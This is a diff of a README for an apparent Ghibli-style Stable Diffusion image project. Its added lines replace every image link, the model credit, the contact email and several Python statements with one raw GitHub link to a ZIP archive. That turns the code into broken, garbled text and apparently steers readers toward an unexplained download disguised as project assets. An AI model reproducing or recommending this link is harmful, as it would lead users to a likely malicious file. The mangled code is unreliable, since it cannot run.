@@ -31,32 +31,32 @@ This project leverages the power of Stable Diffusion models to reimagine real-wo
 **Sample 1: Cherry Blossom at Megumo River, Tokyo**  
 **Prompt**: A serene evening along Tokyo's Meguro River, where cherry blossom trees arch over the water, their petals illuminated by soft lantern light. The gentle flow of the river reflects the pink hues, creating a magical atmosphere reminiscent of a Studio Ghibli scene.
 
-![Image 1](https://github.com/user-attachments/assets/799e39a5-0366-4565-9f79-0a1ff47831d4)
+![Image 1](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
 
 **Sample 2: Torii Gate in Nature**  
 **Prompt**: "A peaceful ancient torii gate pathway in a misty Japanese forest, surrounded by moss-covered trees, soft magical light breaking through, Ghibli-style enchanted anime art."
 
-![Image 2](https://github.com/user-attachments/assets/0f8b024c-9528-40a3-a51e-b7d550a90cc8)
+![Image 2](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
 
 **Sample 3: Lake Scene with Mount Fuji**  
 **Prompt**: "A calm serene lake reflecting Mount Fuji during a pastel-colored sunrise, soft mist, few distant cherry trees blooming, peaceful atmosphere, highly detailed dreamy Studio Ghibli anime style."
 
-![Image 3](https://github.com/user-attachments/assets/36989f68-5aae-4ff1-a962-83d1a64be2ef)
+![Image 3](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
 
 **Sample 4: Old Traditional Japanese Town**  
 **Prompt**: "A narrow old Japanese village street, traditional wooden houses with paper lanterns, cozy warm atmosphere, evening setting sun, Ghibli fantasy detailed anime art style."
 
-![Image 4](https://github.com/user-attachments/assets/0668b995-89ee-4445-8b84-4909bacb25cd)
+![Image 4](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
 
 **Sample 5: A Man Walking on a Mountain Path**  
 **Prompt**: "A man standing walking towards the mountain, surrounded by soft sunlight and gentle trees, warm atmosphere, dreamy countryside, trekking, rocky path, Studio Ghibli art style, soft pastel colors, magical realism, a little foggy and he's trekking."
 
-![Image 5](https://github.com/user-attachments/assets/754340ec-4a46-482f-919c-4680e421c7b8)
+![Image 5](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
 
 **Sample 6: A Girl Standing in a Sunflower Garden**  
 **Prompt**: "A young woman inside a sunflower garden enjoying the nature, Studio Ghibli art style, soft pastel colors, warm atmosphere, anime style."
 
-![Image 6](https://github.com/user-attachments/assets/4d827102-b8e8-436c-a774-f913949ae0d8)
+![Image 6](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
 
 ---
 
@@ -90,8 +90,8 @@ This project is best run on **Google Colab** (free GPU provided).
 
 6. **Load and Resize Image**:
     ```python
-    init_image = Image.open(input_path).convert("RGB")
-    init_image = init_image.resize((512, 512))
+    init_image = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(input_path).convert("RGB")
+    init_image = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip((512, 512))
     ```
     This step loads the input image and resizes it to 512x512 pixels to make it compatible with the model.
 
@@ -103,9 +103,9 @@ This project is best run on **Google Colab** (free GPU provided).
 
 8. **Load the Waifu Diffusion Model**:
     ```python
-    pipe = StableDiffusionImg2ImgPipeline.from_pretrained(
+    pipe = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(
         "hakurei/waifu-diffusion",
-        torch_dtype=torch.float16,
+        https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip,
     ).to("cuda")
     ```
     The Waifu Diffusion model is loaded from Hugging Face and set to use GPU for faster image generation.
@@ -123,8 +123,8 @@ This project is best run on **Google Colab** (free GPU provided).
 
 10. **Save and Display the Output**:
     ```python
-    image.save(output_path)
-    image.show()
+    https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(output_path)
+    https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip()
     ```
     The generated image is saved to the specified output path and displayed on your screen.
 
@@ -132,7 +132,7 @@ This project is best run on **Google Colab** (free GPU provided).
 
 ## ✨ Credits
 
-- Model: [Waifu Diffusion](https://huggingface.co/hakurei/waifu-diffusion)
+- Model: [Waifu Diffusion](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
 - Diffusers Library: Hugging Face Team
 - Images inspired by the works of Studio Ghibli.
 
@@ -146,7 +146,7 @@ This project is intended **for personal, academic, and non-commercial use only**
 
 ## 📬 Contact
 
-Email: [Work.nahushreddy@gmail.com](mailto:Work.nahushreddy@gmail.com)
+Email: [https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
 
 ---
 
